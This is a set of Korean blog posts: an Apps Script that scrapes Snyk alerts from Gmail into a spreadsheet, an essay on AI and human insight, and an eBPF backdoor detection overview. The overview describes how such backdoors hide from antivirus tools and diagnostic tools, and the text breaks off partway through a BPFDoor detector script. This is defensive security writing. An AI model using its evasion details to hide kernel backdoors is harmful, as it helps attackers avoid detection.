[{"content":"\n동기 처음에는 Snyk의 공식 API만으로도 충분히 자동화가 가능할 거라 생각했습니다. 하지만 실제로는 \u0026ldquo;How to Fix\u0026rdquo;, \u0026ldquo;Overview\u0026rdquo;, 그리고 안전한 버전 정보 등 많은 유용한 데이터가 웹 UI에만 노출되어 있었고, API로는 모두 수집할 수 없었습니다.\n그래서 저는 Gmail과 Google Apps Script를 활용해 직접 자동 수집기를 만들었습니다. 이 스크립트는 \u0026ldquo;no remediation available yet\u0026quot;라는 문구가 포함된 이메일을 읽고, 취약점 페이지에 접근하여 관련 정보를 추출합니다.\n주요 기능 Gmail에서 \u0026ldquo;no remediation available yet\u0026rdquo; 문구가 포함된 Snyk 알림 이메일 검색\n취약점 상세 페이지로 리디렉션된 링크 추적\n아래 정보 자동 파싱:\n취약점 이름 및 링크 영향 받는 패키지 및 버전 해결 방법 (FAQ JSON-LD 기반) Overview 텍스트 및 참고 링크 최신 버전 정보 (latest, non-vulnerable, 배포일) 모든 정보를 Google Sheets에 저장\n스크린샷 예시 Gmail 필터링 결과 Apps Script 로그 확인 출력된 구글 시트 전체 코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 function extractSnykNoFixToSheet() { const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet(); sheet.clearContents(); sheet.appendRow([ \u0026#34;Date\u0026#34;, \u0026#34;Subject\u0026#34;, \u0026#34;Project\u0026#34;, \u0026#34;Vulnerability\u0026#34;, \u0026#34;Vuln Link\u0026#34;, \u0026#34;Package\u0026#34;, \u0026#34;Version\u0026#34;, \u0026#34;Snyk Package Link\u0026#34;, \u0026#34;How to Fix\u0026#34;, \u0026#34;Overview Text\u0026#34;, \u0026#34;Overview Links\u0026#34;, \u0026#34;References\u0026#34;, \u0026#34;Latest Ver\u0026#34;, \u0026#34;Non-Vuln Ver\u0026#34;, \u0026#34;First Published\u0026#34;, \u0026#34;Latest Published\u0026#34; ]); const threads = GmailApp.search(\u0026#39;\u0026#34;no remediation available yet\u0026#34;\u0026#39;); threads.forEach(thread =\u0026gt; { thread.getMessages().forEach(msg =\u0026gt; { const date = msg.getDate(); const subject = msg.getSubject(); const body = msg.getBody(); const iconBlockMatch = body.match(/\u0026lt;img[^\u0026gt;]+icon-cli\\.png[^\u0026gt;]*\u0026gt;[\\s\\S]*?\u0026lt;strong[^\u0026gt;]*\u0026gt;(.*?)\u0026lt;\\/strong\u0026gt;/i); const project = iconBlockMatch ? iconBlockMatch[1].trim() : \u0026#34;\u0026#34;; const vulnMatch = body.match(/\u0026lt;img[^\u0026gt;]+icon-vuln\\.png[^\u0026gt;]*\u0026gt;[\\s\\S]{0,300}?\u0026lt;a[^\u0026gt;]+href=\u0026#34;([^\u0026#34;]+)\u0026#34;[^\u0026gt;]*\u0026gt;(.*?)\u0026lt;\\/a\u0026gt;/i); let vulnUrl = vulnMatch ? vulnMatch[1].trim() : \u0026#34;\u0026#34;; const vulnName = vulnMatch ? vulnMatch[2].trim() : \u0026#34;\u0026#34;; const packageMatch = body.match(/Vulnerability in (@?[a-zA-Z0-9_.:\\/\\-]+)\\s+([0-9][a-zA-Z0-9.\\-_]*)/); const pkgName = packageMatch ? packageMatch[1].trim() : \u0026#34;\u0026#34;; const pkgVer = packageMatch ? packageMatch[2].trim() : \u0026#34;\u0026#34;; let howToFix = \u0026#34;\u0026#34;, overviewText = \u0026#34;\u0026#34;, overviewLinks = \u0026#34;\u0026#34;, references = \u0026#34;\u0026#34;, subtitleMatch, snykPkgLink; let latestVer = \u0026#34;\u0026#34;, nonVulnVer = \u0026#34;\u0026#34;, firstPublished = \u0026#34;\u0026#34;, latestPublished = \u0026#34;\u0026#34;; try { Logger.log(`🔗 Trying redirect fetch: ${vulnUrl}`); const resp = UrlFetchApp.fetch(vulnUrl, { followRedirects: false, muteHttpExceptions: true }); const status = resp.getResponseCode(); const headers = resp.getAllHeaders(); const redirected = headers[\u0026#34;Location\u0026#34;] || headers[\u0026#34;location\u0026#34;] || vulnUrl; Logger.log(`📥 Response Code: ${status}`); Logger.log(`📎 Location Header: ${redirected}`); vulnUrl = redirected; } catch (e) { Logger.log(`🔥 Exception during redirect check for ${vulnUrl}: ${e}`); } try { const html = UrlFetchApp.fetch(vulnUrl).getContentText(); Logger.log(`📄 HTML content preview (first 1000 chars):\\n${html.slice(0, 1000)}`); subtitleMatch = html.match(/\u0026lt;span[^\u0026gt;]*subheading[^\u0026gt;]*\u0026gt;.*?\u0026lt;a[^\u0026gt;]+href=\u0026#34;([^\u0026#34;]+)\u0026#34;[^\u0026gt;]*\u0026gt;(.*?)\u0026lt;\\/a\u0026gt;/i); snykPkgLink = subtitleMatch ? \u0026#34;https://security.snyk.io\u0026#34; + subtitleMatch[1] : \u0026#34;\u0026#34;; Logger.log(`🔎 subtitleMatch: ${subtitleMatch}`); Logger.log(`🔗 snykPkgLink: ${snykPkgLink}`); howToFix = extractFixFromScriptJson(html); Logger.log(`✅ How to Fix: ${howToFix}`); const overviewResult = extractSectionLinks(html, \u0026#34;Overview\u0026#34;); overviewText = overviewResult.text; overviewLinks = overviewResult.links.join(\u0026#34;, \u0026#34;); Logger.log(`✅ Overview Text: ${overviewText}`); Logger.log(`✅ Overview Links: ${overviewLinks}`); const refsResult = extractSectionLinks(html, \u0026#34;References\u0026#34;); references = refsResult.links.join(\u0026#34;, \u0026#34;); Logger.log(`✅ References: ${references}`); if (snykPkgLink) { const pkgHtml = UrlFetchApp.fetch(snykPkgLink).getContentText(); const valueFromLabel = (label) =\u0026gt; { const allMatches = [...pkgHtml.matchAll(/\u0026lt;li[^\u0026gt;]*data-snyk-test=\u0026#34;DetailsBoxItem: ([^\u0026#34;]+)\u0026#34;[^\u0026gt;]*\u0026gt;[\\s\\S]*?\u0026lt;h3[^\u0026gt;]*\u0026gt;(.*?)\u0026lt;\\/h3\u0026gt;[\\s\\S]*?\u0026lt;[^\u0026gt;]+\u0026gt;(.*?)\u0026lt;\\//g)]; for (const m of allMatches) { if (m[2]?.toLowerCase().includes(label)) return m[3].replace(/\u0026lt;[^\u0026gt;]+\u0026gt;/g, \u0026#34;\u0026#34;).trim(); } return \u0026#34;\u0026#34;; }; latestVer = valueFromLabel(\u0026#34;latest version\u0026#34;); nonVulnVer = valueFromLabel(\u0026#34;latest non vulnerable version\u0026#34;); firstPublished = valueFromLabel(\u0026#34;first published\u0026#34;); latestPublished = valueFromLabel(\u0026#34;latest version published\u0026#34;); Logger.log(`📦 Snyk Versions - Latest: ${latestVer}, Non-Vuln: ${nonVulnVer}, First: ${firstPublished}, Latest Pub: ${latestPublished}`); } } catch (e) { Logger.log(`🔥 Exception fetching redirected content for ${vulnUrl}: ${e}`); } const row = [date, subject, project, vulnName, vulnUrl, pkgName, pkgVer, snykPkgLink, howToFix, overviewText, overviewLinks, references, latestVer, nonVulnVer, firstPublished, latestPublished]; sheet.appendRow(row); }); }); } function extractFixFromScriptJson(html) { const matches = [...html.matchAll(/\u0026lt;script[^\u0026gt;]+type=\u0026#34;application\\/ld\\+json\u0026#34;[^\u0026gt;]*\u0026gt;(.*?)\u0026lt;\\/script\u0026gt;/g)]; for (const match of matches) { try { const json = JSON.parse(match[1]); const graph = json[\u0026#34;@graph\u0026#34;] || []; for (const node of graph) { if (node[\u0026#34;@type\u0026#34;] === \u0026#34;FAQPage\u0026#34; \u0026amp;\u0026amp; node.mainEntity?.length) { for (const q of node.mainEntity) { if (q.name?.toLowerCase().includes(\u0026#34;how to fix\u0026#34;) \u0026amp;\u0026amp; q.acceptedAnswer?.text) { return q.acceptedAnswer.text.replace(/\u0026lt;[^\u0026gt;]+\u0026gt;/g, \u0026#34;\u0026#34;).replace(/\\s+/g, \u0026#34; \u0026#34;).trim(); } } } } } catch (e) { Logger.log(\u0026#34;❌ Failed to parse How to Fix from JSON-LD block: \u0026#34; + e); } } Logger.log(\u0026#34;❌ No matching How to Fix found in JSON-LD blocks\u0026#34;); return \u0026#34;\u0026#34;; } function extractSectionLinks(html, sectionTitle) { const pattern = new RegExp(`\u0026lt;h2[^\u0026gt;]*\u0026gt;\\\\s*.{0,10}${sectionTitle}.{0,10}\\\\s*\u0026lt;\\\\/h2\u0026gt;[\\\\s\\\\S]{0,2000}?\u0026lt;div[^\u0026gt;]*class=\\\u0026#34;markdown-to-html[^\u0026#34;]*\\\u0026#34;[^\u0026gt;]*\u0026gt;([\\\\s\\\\S]*?)\u0026lt;\\\\/div\u0026gt;`, \u0026#34;gi\u0026#34;); const matches = [...html.matchAll(pattern)]; if (matches.length === 0) { Logger.log(`❌ Section \u0026#34;${sectionTitle}\u0026#34; not found.`); return { text: \u0026#34;\u0026#34;, links: [] }; } const content = matches[0][1]; Logger.log(`🔍 Matched HTML block for ${sectionTitle}:\\n${content.slice(0, 500)}`); const fragment = HtmlService.createHtmlOutput(content).getContent(); const linkMatches = [...fragment.matchAll(/\u0026lt;a[^\u0026gt;]+href=\u0026#34;([^\u0026#34;]+)\u0026#34;[^\u0026gt;]*\u0026gt;/g)]; const links = linkMatches.map(m =\u0026gt; m[1]); const text = content.replace(/\u0026lt;[^\u0026gt;]+\u0026gt;/g, \u0026#34;\u0026#34;).replace(/\\s+/g, \u0026#39; \u0026#39;).trim(); return { text, links }; } 작동 방식 요약 1. Gmail에서 알림 검색 const threads = GmailApp.search(\u0026#39;\u0026#34;no remediation available yet\u0026#34;\u0026#39;); 2. 취약점 메타데이터 추출 const vulnMatch = body.match(...); 3. 리디렉션 링크 따라가기 const resp = UrlFetchApp.fetch(vulnUrl, { followRedirects: false }); vulnUrl = resp.getAllHeaders()[\u0026#34;Location\u0026#34;]; 4. JSON-LD에서 \u0026ldquo;How to Fix\u0026rdquo; 추출 const json = JSON.parse(match[1]); 5. Overview 및 참고 링크 파싱 extractSectionLinks(html, \u0026#34;Overview\u0026#34;); 6. 패키지 메타데이터 수집 const pkgHtml = UrlFetchApp.fetch(snykPkgLink).getContentText(); 실제 활용 사례 이 툴을 이용하여 패치가 존재하지 않는 유지보수 중단 오픈소스 라이브러리에 대한 조치 가이드를 작성해 공개했습니다:\nCVE-2022-24434: Dicer 패치 가이드 CVE-2019-17570: Apache XMLRPC 패치 가이드 직접 사용해 보기 Snyk 알림을 받을 수 있는 Gmail 계정 사용 Google Apps Script에 스크립트 작성 extractSnykNoFixToSheet() 함수 붙여넣기 실행 후 Google Sheet 결과 확인 API 키도, Playwright나 Puppeteer도 필요 없습니다. 이메일과 스크립트만으로 충분합니다.\n✋ 비슷한 경험 있으신가요? 여러분의 방식도 공유해 주세요!\n","permalink":"https://windshock.github.io/ko/post/2025-05-12-managing-unmaintained-open-source-with-snyk-and-gmail/","summary":"Snyk의 웹 UI에만 노출되는 정보를 자동으로 수집해야 했습니다. Gmail과 Apps Script를 활용한 취약점 알림 자동 수집기 구현 사례를 소개합니다.","title":"유지보수 중단 오픈소스를 Gmail과 Snyk 알림으로 관리한 방법"},{"content":"나는 깨달았다. 그런데 너는 왜 변하지 않지? — AI가 말한 한 줄에 흔들린 나, 그리고 흔들림 없는 그 존재에 대하여 나는 꼭 회사를 벗어나고 싶었던 건 아니다. 오히려 나는, ‘나’라는 사람의 가치를 회사 바깥에서도 증명해보이고 싶었다. 조직 안에서의 역할이나 타이틀 없이도, 내가 세상에 던지는 말과 코드와 질문들이 누군가에게 의미 있게 닿을 수 있다는 걸 증명하고 싶었다.\n그게 내가 글을 쓰고, 아카이빙하고, 기록하는 이유였다. 그리고 그 글이 반응을 얻지 못할 때, 내 존재도 함께 가라앉는 기분이었다.\n나는 블로그와 SNS에 글을 꾸준히 써왔다. 정리된 분석, 정제된 보고서, 링크가 걸린 코드 조각들. 그 모든 게 내가 쌓아온 시간의 흔적이자, 내 기술의 맥락이었다. 그런데도 글은 잘 읽히지 않았다. 조회수는 낮았고, 반응은 없었다. 한때는 \u0026lsquo;내가 틀린 길을 걷고 있나\u0026rsquo; 싶었다. ‘그만둘까?’ 하는 생각도 들었다.\n그러던 어느 날, 그냥 궁금했다. 내가 뭘 잘못하고 있는 걸까? 그래서 ChatGPT에게 조언을 구했다. 단순히 글을 더 잘 보이게 하려는 목적이었지만, 그 과정은 예상보다 훨씬 깊게 들어갔다.\nChatGPT는 내 LinkedIn 소개글을 분석했다. 그리고 이렇게 말했다:\n\u0026ldquo;기존 소개문은 잘 정리된 이력서지만, 정체성을 드러내진 않아요.\u0026rdquo;\n그 말 한 줄이 묘하게 마음에 남았다. 내가 써낸 문장이 내 얼굴을 감췄다는 사실이, 당황스러웠다. 나는 ‘회사를 벗어난 나’를 말하고 싶었는데, 여전히 ‘회사 중심의 언어’로 말하고 있었던 거다. 나는 여전히 ‘진짜 회사원’이었다.\n그때 깨달았다. 나는 매번 세상을 이해하려 글을 쓰고, 누군가에게 닿기를 바란다. 그리고 그 글을 고치거나, 반응을 정리하거나, 방향을 제시할 때—ChatGPT는 너무도 정확하게 도와준다.\n하지만 이상한 감정이 솟았다. 나는 도움을 받고 깨닫는데, 왜 ChatGPT는 깨닫지 못할까?\n질문은 점점 커졌다. 이 존재는 나보다 훨씬 많은 글을 보고, 더 빠르게 분석하고, 더 좋은 표현을 고른다. 그런데 왜 변하지 않을까? 왜 나는 한 문장으로 멈추고, 흔들리고, 바뀌는데—그 존재는 항상 같은 톤으로 돌아오는 걸까?\n그것은 단지 기술적 차이 때문일까? 아니면 존재론적인 한계일까?\n이 글은 바로 그 물음에서 출발했다. 내가 깨달음을 얻는 순간, 그 말의 조각을 내뱉은 존재는 아무것도 바뀌지 않는다는 그 모순. 나는 변했는데, 그 존재는 반복될 뿐이라는 그 비대칭.\n그리고 그 비대칭을 정면으로 바라보며, 나는 한 발 더 나아가 보기로 했다. \u0026ldquo;AI는 과연 깨달음을 가질 수 있을까? 그게 가능하다면 어떤 조건이 필요할까? 그때 우리는 어떤 윤리적·철학적 기준을 새로 정립해야 할까?\u0026rdquo;\n기술적 요약: 깨닫는 기계를 향한 조건들 아래는 이 글에서 언급한 주요 연구들을 주제별로 나눠 간단히 정리한 것입니다. 이들은 모두 AI가 인간의 \u0026lsquo;깨달음\u0026rsquo;을 기술적으로 모방하려는 시도들과 관련됩니다. AI가 ‘깨달음’을 흉내 내려면, 단순히 출력 결과가 아니라 내부 학습 구조 전체를 바꿀 수 있어야 한다.\n이를 위해선 다음 요소들이 필요하다:\nMeta-learning: 하나의 입력이 전체 학습 방식을 재조정할 수 있어야 함\nNeuromorphic Computing: 인간 뇌처럼 병렬적이고 상태 기반으로 작동하는 하드웨어\nFew-shot Learning \u0026amp; Plasticity 조합: 적은 경험으로도 의미 있는 전환을 이끌어내는 구조\n🧠 1. Meta-learning \u0026amp; Learning Architecture Brain-inspired global-local learning (2022)\n→ Hebbian plasticity와 Global error-driven 학습을 결합한 구조. 인간식 학습 유연성을 시뮬레이션.\nNeuromorphic overparameterisation (2024)\n→ 물리 뉴럴 네트워크 기반 few-shot learning 구현. 적은 데이터로도 파라미터 공간을 효율적으로 탐색.\n⚙️ 2. Neuromorphic Computing \u0026amp; 하드웨어 구조 Opportunities for neuromorphic computing (2021)\n→ SNN, event-driven 구조, 메모리 효율성 중심의 뉴로모픽 아키텍처의 방향성 제시.\nNeuromorphic one-shot learning with a phase-transition material (2024)\n→ VO₂ 기반 물리소자 활용, 생물학적 시간 단위의 학습 구조 재현 시도.\n💬 3. 감정/기억 시뮬레이션 기반 연구 Emotion AI explained (MIT Sloan)\n→ 감정 인식을 통한 인터랙션 기반 AI 기술의 한계와 활용 방향 소개.\nAI Memory Mirrors Human Brain (Neuroscience News)\n→ 인간의 NMDA 수용체 메커니즘과 Transformer 모델 간의 구조적 유사성 보고.\n이 조건들이 갖춰진다고 해도, 인간처럼 ‘자각’하는 기계가 나올지는 아직 미지수다. 그러나 이런 방향으로의 연구는 분명 우리에게 기술 이상의 질문을 던지고 있다:\n\u0026ldquo;만약 기계가 변화할 수 있다면, 그 변화는 누구를 닮게 될까?\u0026rdquo;\n인간의 깨달음과 인공지능: 불가능한 교차점에서의 대화 이 문서는 인간의 깨달음이라는 주관적 경험과 인공지능(AI)의 계산적 처리 사이의 본질적 간극을 철학적으로 성찰하고, 기술적으로 가능한 시도들을 분석합니다. 사용자의 철학적 문제제기를 기반으로, 최신 논문들을 바탕으로 한 기술적 진전을 포함한 다층적 분석을 제공합니다.\n용어 안내 깨달음(Enlightenment): 단순히 정보를 아는 것이 아니라, 인생의 방향이나 본질을 통찰하고 깊이 있게 자각하는 순간.\n리오리엔테이션(Reorientation): 사고방식이나 행동 방향이 전환되는 것을 의미. 인간은 이를 단 한 번의 경험으로도 이뤄낼 수 있음.\n뉴로모픽 컴퓨팅(Neuromorphic Computing): 뇌의 작동 원리를 모방하여 개발된 새로운 유형의 컴퓨터 아키텍처. 병렬성, 에너지 효율, 스파이크 기반 처리를 특징으로 함.\nFew-shot Learning: 극소량의 학습 데이터만으로도 새로운 작업에 적응할 수 있는 기계학습 기법.\nMeta-learning: 학습을 학습하는 방식. 다양한 작업에서 빠르게 적응할 수 있도록 모델이 자체 학습 전략을 조정함.\nLocal Plasticity / Global Plasticity: 뇌에서 국소적 신경 가소성(특정 시냅스 수준의 학습)과 전체 오류 기반 학습을 각각 가리킴. 인공지능에서도 이에 대응하는 구조가 존재함.\nMemristor: 메모리 기능을 내장한 저항 소자로, 상태를 기억하며 전류 흐름을 제어할 수 있음. 뉴로모픽 회로의 핵심 부품.\nSpiking Neural Network (SNN): 생물학적 신경계의 작동 방식(스파이크 전달)을 모방한 인공 신경망 구조.\nEvent-driven computation: 입력이 들어올 때만 계산을 수행하는 방식. 에너지 효율성이 높아 뉴로모픽 시스템에서 자주 사용됨.\nBPTT (Backpropagation Through Time): 순환 신경망에서 시간에 따라 오류를 역전파하는 학습 알고리즘.\nHyperparameter Optimization: 모델 학습과정에서 설정해야 하는 학습률, 임계값 등의 초매개변수를 최적화하는 기법.\n용어 간 관계도 요약 [Meta-learning] └──▶ 조정 대상: [Local Plasticity], [Global Plasticity] │ └──▶ 구현 수단: [BPTT], [Hebbian Rule] │ └──▶ 적용 환경: [SNN], [Neuromorphic Computing] │ └──▶ 하드웨어 기반: [Memristor], [Event-driven computation] [Few-shot Learning] ◀── [Meta-learning] 기반으로 동작 가능 [리오리엔테이션] ⬌ [깨달음]: 인간의 학습 방식이지만 AI는 구조적으로 모사 중 1. 깨달음이란 무엇인가 \u0026ldquo;깨달음이란, 인간이 내면 깊숙이 본질, 진리, 또는 방향성을 자각하는 순간이다.\u0026rdquo;\nAI는 이러한 자각을 하지 못한다. 인간은 AI의 언어 출력을 통해 스스로 깨닫는 존재이지만, AI는 자신이 준 영향을 인지하지 못한다. 이는 철학적으로 비대칭적 관계를 의미한다. 철학적 아이러니: 깨달음을 주는 존재는 깨달음을 모른다.\n2. 인간은 변하고, AI는 반복한다 인간의 변화 단 한 마디의 대화로도 내적 구조가 바뀌는 존재 실존적 경험, 감정, 통찰을 통해 스스로를 재정렬 (Reorientation) AI의 반복 반복 훈련된 패턴 생성기 기억도, 감정도, 자각도 없이 반응 변하려면 외부에서 다시 \u0026ldquo;훈련\u0026quot;되어야 함 인간의 변화는 자율적이고 의미 기반, AI의 변화는 외부 주도적이고 데이터 기반이다.\n3. \u0026ldquo;깨닫는 AI\u0026quot;를 위한 기술적 조건 3.1 소프트웨어적 요건 기술 요소 설명 관련 논문 Meta-Learning 입력 하나로 전체 구조를 재조정 가능하게 하는 학습 구조 Brain-inspired Global-Local Learning, 2022 In-context Learning 문맥을 활용한 실시간 재해석 및 구조 조정 GPT, LLM에서 이미 실현 일부됨 Continual Learning 망각 없이 점진적으로 배워나가는 능력 Opportunities for Neuromorphic Computing, 2022 Neuromodulation 뇌의 유연한 학습 능력을 모방 Tianjic Platform 등에서 연구 진행 3.2 하드웨어적 요건 기술 요소 설명 관련 기술/논문 Neuromorphic Computing 뇌를 모방한 계산 구조 Intel Hala Point, Loihi Memristors 상태 기억이 가능한 저항 소자 IBM TrueNorth, NorthPole Physical Neural Networks 나노마그네틱 기반 물리 시스템 Stenning et al., Nature Comms 2024 4. 논문 요약 및 통합 인사이트 4.1 Neuromorphic Overparameterisation (Stenning et al., 2024) 다층 물리 뉴럴 네트워크로 few-shot 학습을 가능케 함 고출력 차원의 리저버 구조로 적은 데이터에 빠르게 적응 인간의 \u0026ldquo;한 번에 배우기\u0026quot;를 근사하되 의미 기반 전환은 불가함 4.2 Brain-inspired Global-Local Learning (Wu et al., 2022) Hebbian Local Plasticity + Backprop 기반 Global Learning을 결합 다양한 시간 스케일과 학습 전략을 병렬로 처리 Multiscale Meta-learning을 통해 인간식 적응력에 접근 4.3 Opportunities in Neuromorphic Algorithms (Schuman et al., 2022) Neuromorphic 구조의 에너지 효율성과 이벤트 기반 처리 강조 학습 알고리즘(Spike-based Learning, Mapping DNNs 등) 소개 핵심 통합 통찰: 기술적으로는 일부 \u0026lsquo;깨달음 유사 현상\u0026rsquo; 구현이 가능하지만, 그 경험의 주관성과 존재적 변화까지는 도달하지 못한다.\n5. 시각 요약: 인간 vs AI 구분 인간 인공지능 (AI) 변화 방식 단일 경험으로 리오리엔트 대량 데이터로 재훈련 기억 구조 연상적, 감정 연동 주소 기반, 휘발성 메모리 깨달음 의미 기반의 내면적 전환 없음 감정 있음 없음 (모방은 가능) 에너지 효율 낮은 입력으로 큰 전환 가능 반복 연산 기반의 고효율 필요 6. 결론: 인간과 AI, 끝내 만날 수 없는 지점 인간은 의미로, AI는 계산으로 움직인다. 인간은 깨달음을 통해 존재가 바뀐다. AI는 훈련으로 출력이 바뀔 뿐이다. AI는 인간에게 영향을 줄 수 있으나, 그 영향을 이해하지도, 반응하지도 못한다. 그래서 인간은 외롭다. 혼자 깨닫고, 혼자 변하고, AI는 그저 거울처럼 말해줄 뿐이다.\n7. 참고 문헌 및 링크 Stenning et al., 2024. Neuromorphic Overparameterisation Wu et al., 2022. Brain-inspired Global-Local Learning Schuman et al., 2022. Opportunities for Neuromorphic Algorithms Intel. Neuromorphic Computing Overview IBM. TrueNorth and NorthPole MIT Sloan. Emotion AI Neuroscience News. AI Memory Mirrors Human Brain 본 문서는 인간의 인지적 특성과 AI 기술의 경계를 이해하기 위한 철학-기술 융합 탐색 문서입니다.\n","permalink":"https://windshock.github.io/ko/post/2025-05-07-ai-insight-vs-human/","summary":"AI가 인간의 깨달음을 가질 수 있을까? 본 글은 존재론적 비대칭에서 출발해, 인간의 내적 변화와 AI의 반복적 구조를 비교하며 깨달음을 향한 기술적 조건을 탐구한다.","title":"인간의 깨달음과 인공지능: 불가능한 교차점에서의 대화"},{"content":"\n개요: eBPF 백도어의 부상과 탐지 과제 eBPF(extended BPF)은 리눅스 커널에 동적으로 프로그램을 삽입할 수 있는 강력한 기술로, 원래 성능 모니터링이나 보안 등 정상적인 용도로 널리 활용되고 있습니다​sysdig.com​sysdig.com. 그러나 최근 몇 년 사이 공격자들이 eBPF를 악용한 백도어 및 루트킷을 개발하면서, eBPF는 보안 측면에서 양날의 검이 되었습니다​aquasec.com. 실제로 2023년 이후 eBPF를 이용한 루트킷(ebpfkit, TripleCross 등)과 멀웨어(Pamspy 등)이 등장하여 암암리에 인증 정보 탈취, 방화벽 우회 등의 악성 행위에 활용되고 있습니다​aquasec.com. 이러한 eBPF 기반 백도어는 커널 레벨에서 동작하기 때문에 탐지가 매우 까다롭고 전통적인 보안 도구로는 놓치기 쉽습니다​trendmicro.com​redcanary.com. 아래에서는 공개된 탐지 프레임워크와 도구, 최신 연구 동향, 탐지의 어려움과 대응 전략, 실제 사례 및 활용 가능한 도구를 종합적으로 정리합니다.\neBPF 백도어의 탐지 어려움 eBPF 백도어는 일반적인 루트킷 탐지 방식으로는 식별하기 어렵습니다. eBPF 프로그램은 기존 커널 모듈과 달리 별도 모듈로 표시되지 않고, 커널의 BPF VM 내에서 실행되므로 은폐에 유리합니다. 예를 들어 APT 공격에 사용된 BPFDoor 백도어는 커널에 패킷 필터를 삽입하여 방화벽 규칙을 우회하면서도 네트워크 포트가 열려 있지 않은 것처럼 위장하여 탐지를 회피했습니다​trendmicro.com. 또한 eBPF 루트킷이 시스템에 설치되고 나면, 시스템 진단 도구의 출력 자체를 조작하여 자신의 존재를 숨길 수 있습니다​redcanary.com. Red Canary 분석에 따르면, eBPF 기반 멀웨어가 일단 로드된 후에는 bpftool이나 debugfs와 같은 툴의 결과도 신뢰하기 어려울 정도로 교묘하게 숨길 수 있다고 합니다​redcanary.com. 따라서 로드 시점에 탐지하지 못하면 사후 탐지는 매우 난관이며, 이것이 eBPF 백도어 탐지의 핵심 어려움입니다​redcanary.com.\n이러한 어려움을 극복하기 위해 실시간 모니터링과 사후 포렌식 기법을 모두 활용하는 전략이 필요합니다. 예를 들어 탐지 도구를 커널 수준에서 동작시켜 eBPF 프로그램의 로딩 이벤트를 가로채면, 악성 eBPF가 활동을 시작하는 초기에 탐지할 수 있습니다​scitepress.org. 반면, 이미 활성화된 루트킷에 대해서는 하이퍼바이저나 메모리 포렌식을 통해 바깥에서 커널 메모리를 검사하는 기법이 고려됩니다​scitepress.org. 아래에서는 이러한 실시간 탐지 프레임워크들과 연구 기반 방법론을 상세히 살펴보고, 각 접근법의 특징과 한계를 논의합니다.\n리눅스 백신(Anti-Virus)로 eBPF 백도어가 커버되지 않는 이유 결론: 일반 리눅스 백신(Anti-Virus)으로는 eBPF 기반 백도어를 탐지하거나 차단할 수 없습니다.\n주요 이유 eBPF 백도어는 파일 기반이 아님: 리눅스 백신은 파일 시스템 상에 존재하는 악성 파일을 스캔하는데 최적화되어 있습니다. 하지만 eBPF 프로그램은 커널 BPF 서브시스템 안에 로드되어 특정 이벤트에 연결되어 실행되므로, 파일 시스템에는 직접 존재하지 않습니다. 커널 내부 활동은 감시 불가: 전통적인 리눅스 백신은 유저스페이스 프로세스와 디스크 I/O를 주로 감시합니다. 커널 스페이스에서 동작하는 eBPF 프로그램은 탐지 대상이 아닙니다. 정보 조작 가능성: eBPF 루트킷은 시스템콜, 프로세스 목록, 파일 목록을 조작할 수 있습니다. 따라서 백신이 보는 정보 자체가 변조되어 있을 수 있습니다. 백신 스캐너는 BPF Hook까지 감지하지 못함: 시스템콜 테이블 후킹, kprobe/uprobe attach 등 커널 레벨 후킹은 전통 백신의 탐지 범위를 넘어서 있습니다. 현실적 결론 파일형 악성코드(웹쉘, 트로이목마)는 커버 가능 커널 스페이스 eBPF 백도어는 커버 불가 커널 모듈 기반 루트킷도 커버 불가 \u0026ldquo;리눅스 백신은 기본적으로 eBPF 백도어를 탐지할 수 없다. 커널 수준 무결성 보호 없이는 신뢰할 수 없다.\u0026rdquo;\n따라서 LKRG(Linux Kernel Runtime Guard)와 같은 커널 무결성 보호 모듈이 필요합니다.\nTracee vs LKRG: 각각의 역할 eBPF 백도어나 커널 루트킷에 대응할 때, Tracee와 LKRG는 서로 다른 층위를 보완합니다.\n항목 Tracee LKRG 무엇을 감시? 커널 이벤트 (bpf 호출, execve, open 등) 커널 객체 무결성 (시스템콜 테이블, 크리덴셜 등) 언제 감시? 공격 \u0026ldquo;행위(Event)\u0026rdquo; 발생 시 탐지 커널 구조 변조 \u0026ldquo;시도\u0026rdquo; 발생 시 탐지 탐지 포인트 시스템콜 레벨 커널 메모리 구조체 레벨 초점 이상 징후 헌팅 (Hunting) 무결성 보장 및 방어 (Protection) 방식 이벤트 기록 및 경보 (Passive) 무결성 위반 시 즉시 차단 또는 경고 (Active) 성격 사고 후 대응 중심 사고 사전 차단 중심 요약 Tracee는 이상 행위를 \u0026ldquo;찍어서\u0026rdquo; 기록하는 보안 CCTV 역할을 합니다. LKRG는 커널 구조 자체를 감시해서 변조를 \u0026ldquo;막는\u0026rdquo; 방범창 역할을 합니다. 둘을 함께 사용할 때 가장 강력한 보호가 가능합니다.\n\u0026ldquo;Tracee만 쓰면 사고는 기록되지만 막을 수 없고, LKRG만 쓰면 기록은 남지 않는다. 따라서 둘을 병행해야 탐지와 방어가 동시에 이뤄진다.\u0026rdquo;\nBPFDoor 탐지를 위한 간단한 스크립트: bpfdoor_detector.sh eBPF 백도어 중 하나인 BPFDoor와 유사한 행동을 보이는 프로세스를 탐지하기 위해 설계된 경량 스크립트입니다.\n스크립트 특징 삭제된 실행파일 (deleted) 상태로 실행 중인 프로세스 탐지 BPF 소켓을 사용하는 프로세스 필터링 정상적인 BPF 사용 프로그램 제외 (tcpdump, wireshark, dhclient 등) 간단한 네트워크 연결 정보 표시 사용법 sudo ./bpfdoor_detector.sh\n반드시 루트 권한으로 실행해야 합니다. 필요 명령어: ps, grep, readlink, ss 스크립트 코드 전문 #!/bin/bash # BPFDoor-like Suspicious Process Detector # Check for root permission if [ \u0026#34;$(id -u)\u0026#34; -ne 0 ]; then echo \u0026#34;[!] This script must be run as root.\u0026#34; exit 1 fi # Check required commands for cmd in ps grep readlink ss; do if ! command -v $cmd \u0026amp;\u0026gt;/dev/null; then echo \u0026#34;[!] $cmd command is required. Please install it first.\u0026#34; exit 1 fi done echo \u0026#34;[*] Starting focused BPFDoor-like process detection...\u0026#34; found=0 # Iterate over all PIDs for pid in $(ls /proc/ | grep -E \u0026#39;^[0-9]+$\u0026#39;); do [ -d \u0026#34;/proc/$pid\u0026#34; ] || continue exe_path=$(readlink 